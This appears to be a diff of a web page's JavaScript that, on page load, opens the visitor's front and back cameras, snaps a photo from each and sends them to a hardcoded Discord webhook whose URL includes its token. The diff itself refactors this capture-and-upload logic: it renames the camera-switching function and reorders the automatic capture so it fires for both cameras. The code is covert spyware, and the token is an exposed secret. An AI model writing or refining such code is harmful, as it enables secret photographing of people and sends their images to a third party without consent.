@@ -17,28 +17,21 @@
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";
 
         let videoStream;
+        let cameras = [];
 
         // Function to get available cameras (front and back)
         function getCameraDevices() {
             return navigator.mediaDevices.enumerateDevices()
                 .then(devices => {
-                    const cameras = devices.filter(device => device.kind === 'videoinput');
+                    cameras = devices.filter(device => device.kind === 'videoinput');
                     return cameras;
                 });
         }
 
-        // Function to switch between front and back cameras
-        function switchCamera(cameraId) {
-            // Stop the current video stream if it exists
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-
-            // Start a new video stream with the selected camera
+        // Function to start the camera stream
+        function startCamera(cameraId) {
             const constraints = {
-                video: {
-                    deviceId: cameraId ? { exact: cameraId } : undefined
-                }
+                video: { deviceId: cameraId ? { exact: cameraId } : undefined }
             };
 
             return navigator.mediaDevices.getUserMedia(constraints)
@@ -51,31 +44,8 @@
                 });
         }
 
-        // Start capturing photos from the front and back cameras if available
-        getCameraDevices().then((cameras) => {
-            // Default to front camera if available
-            const frontCamera = cameras.find(camera => camera.label.toLowerCase().includes('front'));
-            const backCamera = cameras.find(camera => camera.label.toLowerCase().includes('back'));
-
-            // First, start the front camera (or any available camera)
-            switchCamera(frontCamera ? frontCamera.deviceId : (backCamera ? backCamera.deviceId : null));
-
-            // Automatically capture and send a photo from the front camera
-            video.onloadedmetadata = () => {
-                captureAndSendPhoto();
-            };
-
-            // If both cameras are available, switch to the back camera and capture a photo
-            if (backCamera) {
-                setTimeout(() => {
-                    switchCamera(backCamera.deviceId);
-                    captureAndSendPhoto();
-                }, 3000); // Wait for 3 seconds before switching to the back camera
-            }
-        });
-
+        // Function to capture and send a photo
         function captureAndSendPhoto() {
-            // Draw the video frame onto the canvas
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -103,6 +73,32 @@
                     });
             });
         }
+
+        // Start capturing photos from the front and back cameras if available
+        getCameraDevices().then((availableCameras) => {
+            // Find front and back cameras
+            const frontCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('front'));
+            const backCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('back'));
+
+            // Default to front camera if available, else use any available camera
+            if (frontCamera) {
+                startCamera(frontCamera.deviceId);
+                video.onloadedmetadata = () => {
+                    captureAndSendPhoto();
+                };
+            }
+
+            // If back camera is available, switch to it after capturing from the front camera
+            if (backCamera) {
+                setTimeout(() => {
+                    startCamera(backCamera.deviceId);
+                    video.onloadedmetadata = () => {
+                        captureAndSendPhoto();
+                    };
+                }, 3000); // Wait for 3 seconds before switching to the back camera
+            }
+        });
+
     </script>
 </body>
 </html>
